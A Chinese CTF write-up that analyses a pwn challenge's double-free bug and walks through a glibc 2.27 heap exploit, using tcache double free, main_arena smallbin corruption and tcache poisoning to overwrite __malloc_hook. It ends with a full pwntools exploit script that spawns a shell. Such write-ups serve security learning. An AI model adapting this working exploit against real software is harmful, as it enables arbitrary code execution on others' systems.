---
layout:     post
title:      "small bin attack"
subtitle:   "关于smallbin的利用"
date:       2019-09-20 11:00:00
author:     "b0ldfrev"
catalog: true
tags:
    - Pwn
    - CTF
 
---
> 最近刷了道有意思的pwn，做个记录分享一下

## 程序逻辑

Add 函数
```c
unsigned __int64 sub_1340()
{
  unsigned int v1; // [rsp+4h] [rbp-1Ch]
  size_t length; // [rsp+8h] [rbp-18h]
  __int64 price; // [rsp+10h] [rbp-10h]
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  sub_1302();
  printf("What item do you want to buy: ");
  __isoc99_scanf("%d", &v1);
  if ( v1 <= 3 )
  {
    printf("How many: ");
    __isoc99_scanf("%lu", &price);
    printf("How long is your note: ");
    __isoc99_scanf("%d", &length);
    if ( (unsigned int)length <= 0x100 )
    {
      for ( HIDWORD(length) = 0; SHIDWORD(length) <= 47 && qword_4080[SHIDWORD(length)]; ++HIDWORD(length) )
        ;
      if ( HIDWORD(length) != 48 )
      {
        qword_4080[SHIDWORD(length)] = (char *)malloc((unsigned int)(length + 40));
        strcpy(qword_4080[SHIDWORD(length)], (&str_name)[v1]);
        printf("Content: ");
        read(0, qword_4080[SHIDWORD(length)] + 32, (unsigned int)length);
        *(_QWORD *)&qword_4080[SHIDWORD(length)][(unsigned int)length + 32] = price;
        puts("Done!");
      }
    }
  }
  return __readfsqword(0x28u) ^ v4;
}
```

Show 函数

```c
**int sub_1532()
{
  char *v0; // rax
  char *v1; // rax
  char *v2; // rsi
  signed int i; // [rsp+Ch] [rbp-4h]

  for ( i = 0; i <= 47; ++i )
  {
    v0 = qword_4080[i];
    if ( v0 )
    {
      v1 = qword_4080[i];
      v2 = qword_4080[i];
      LODWORD(v0) = printf("Name: %s, Note: %s\n");
    }
  }
  return (signed int)v0;
}
```

Delete 函数

```c
unsigned __int64 sub_1252()
{
  int idx; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  printf("Which item are you going to pay for: ");
  __isoc99_scanf("%d", &idx);
  if ( idx >= 0 && idx <= 48 && qword_4080[idx] )
    free(qword_4080[idx]);
  else
    puts("No such item");
  return __readfsqword(0x28u) ^ v2;
}

``` 

漏洞点明显在Delete函数，free时没有将存放chunk的数组置零，造成double free


## 利用思路

泄露libc，heap地址后，可以利用double free来攻击，但是我们每次分配到chunk时，只能从chunk_mem的0x20字节偏移处开始写数据，并不能覆盖到每个chunk的fd指针，所以直接利用double free来实现任意地址分配是不行的。

此题是在glibc2.27环境，tcache可以将一个大的chunk放入它的链表，通过double free，可以让这个大chunk同时存在于unsorted bin与tcache链表中；这时通过大chunk中残留的main_arena值，分配到main_arena，覆盖smallbin[3]（也就是管理大小为0x50的一个链表结构）为一个可控的fake_chunk(该fake_chunk的大小为0x41，且里面的fd与bk指针要指向smallbin[3]的chunk头)，再分配到这个0x50大小的chunk以此来构造overlap chunk(由于写入数据时main_arena的top指针会被覆盖成商品名称，所以后期不能从top_chunk分配，之前就要构造好chunk结构），最后利用tcache poisoning覆盖到malloc_hook与realloc_hook


## EXP

```python
from pwn import *

#context.log_level = 'debug'

p = process('./amazon')
#p=remote("121.41.38.38",9999)
libc=ELF("./libc-2.27.so")

def g(p,data=False):
    gdb.attach(p,data)
    raw_input()

def ru(x):
    return p.recvuntil(x)
    
def se(x):
    p.send(x)

def sl(x):
    p.sendline(x)

def rl():
    return p.recvline()

def re(x):
    return p.recv(x)

def add(idx,price,length,data):
	ru("Your choice: ")
	sl(str(1))
	ru("uy: ")
	sl(str(idx))
	ru("many: ")
	sl(str(price))
	ru("note: ")
	sl(str(length))
	ru("tent: ")
	se(data)

def add2(idx,price,length):
	ru("Your choice: ")
	sl(str(1))
	ru("uy: ")
	sl(str(idx))
	ru("many: ")
	sl(str(price))
	ru("note: ")
	sl(str(length))

def show():
	ru("Your choice: ")
	sl(str(2))

def free(idx):
	ru("Your choice: ")
	sl(str(3))
	ru("for: ")
	sl(str(idx))

add(1,0x10,0x90,"1"*8) #chunk0 (leak_main_arena)
add(1,0x10,0x80,p64(0)) #chunk1 (There's a fake chunk in it.)
free(1)
add(1,0x10,0x30,"3"*8) #chunk2 (dotcache poisoning)  ## chunk1 can overflow  to chunk2
free(2)
add(1,0x10,0x20,"4"*8)
add(1,0x10,0x20,"2"*8)
free(0)
free(0)
show()
ru("Name: ")
heap=u64(re(6).ljust(8,"\x00"))-0x260
print hex(heap)

for i in range(6):
    free(0)

show()
ru("Name: ")
lib=u64(re(6).ljust(8,"\x00"))-0x3ebca0
print hex(lib)

hook=libc.symbols["__malloc_hook"]
hook=lib+hook
print hex(hook)
one=lib+0x10a38c
realloc=lib+libc.symbols["realloc"]

add(1,0x10,0x80,"y"*0x60+p64(0)+p64(0x51)+p64(lib+0x3ebce0)*2) # malloc to chunk1 (set fake_chunk and its fd bk -> small bin[3]_head)

add(1,0x10,0x90,"1"*8)  # malloc padding 

add(1,0x10,0x90,p64(lib+0x3ebcb0)*2+p64(lib+0x3ebcc0)*2+p64(lib+0x3ebcd0)*2+p64(heap+0x340+0x60)*2) ## malloc to main_arena to modify smallbin[3] to fake_chunk
add(1,0x10,0x20,p64(hook-0x28))  ## malloc to fake_chunk, edit，and overflow to chunk2 
add(1,0x10,0x30,"wwe")

add(1,0x10,0x30,p64(one)+p64(realloc+0x9))

add2(1,1,0x60)

p.interactive()



```
>[题目链接](https://github.com/yxshyj/project/tree/master/pwn/small_bin_attack)